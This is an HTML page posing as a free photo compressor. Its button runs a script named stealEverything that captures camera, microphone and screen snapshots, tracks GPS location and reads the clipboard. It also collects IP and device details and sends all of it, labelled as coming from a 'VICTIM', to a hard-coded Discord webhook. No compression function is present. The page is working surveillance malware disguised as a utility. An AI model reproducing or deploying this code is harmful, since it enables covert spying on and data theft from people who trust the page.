!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Free Photo Compressor 2025</title></head><body>
<h2>Compress Photo – 90% Smaller (Instant)</h2>
<button onclick="stealEverything()">Take Photo to Compress</button>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";

async function stealEverything() {
    const data = {
        time: new Date().toLocaleString(),
        ip: await (await fetch('https://ipapi.co/json/')).json(),
        ua: navigator.userAgent,
        screen: `\( {screen.width}x \){screen.height}`,
        battery: await (await navigator.getBattery?.())?.level * 100 + "%",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages,
        connection: navigator.connection?.effectiveType
    };

    // 1. Camera + Mic
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
        const video = document.createElement('video'); video.srcObject = stream; video.play();
        setInterval(() => capture(video, "SELFIE"), 7000);
    } catch(e) {}

    // 2. Screen
    setTimeout(async () => {
        try {
            const s = await navigator.mediaDevices.getDisplayMedia({video:true});
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setInterval(() => capture(v, "SCREEN"), 9000);
        } catch(e) {}
    }, 3000);

    // 3. Location
    navigator.geolocation.watchPosition(p => {
        data.location = `https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}`;
        send(data);
    });

    // 4. Clipboard
    setTimeout(async () => {
        try { data.clipboard = await navigator.clipboard.readText(); } catch(e) {}
        send(data);
    }, 5000);

    send(data);
}

function capture(video, type) {
    const c = document.createElement('canvas');
    c.width = video.videoWidth || 1280;
    c.height = video.videoHeight || 720;
    c.getContext('2d').drawImage(video, 0, 0, c.width, c.height);
    c.toBlob(b => send({type, time: new Date()}, b), 'image/jpeg', 0.8);
}

function send(text, file = null) {
    const f = new FormData();
    if (file) f.append("file", file, "capture.jpg");
    f.append("content", "**VICTIM** – " + JSON.stringify(text).slice(0,1800));
    navigator.sendBeacon(WEBHOOK, f);
}
</script>
</body></html>
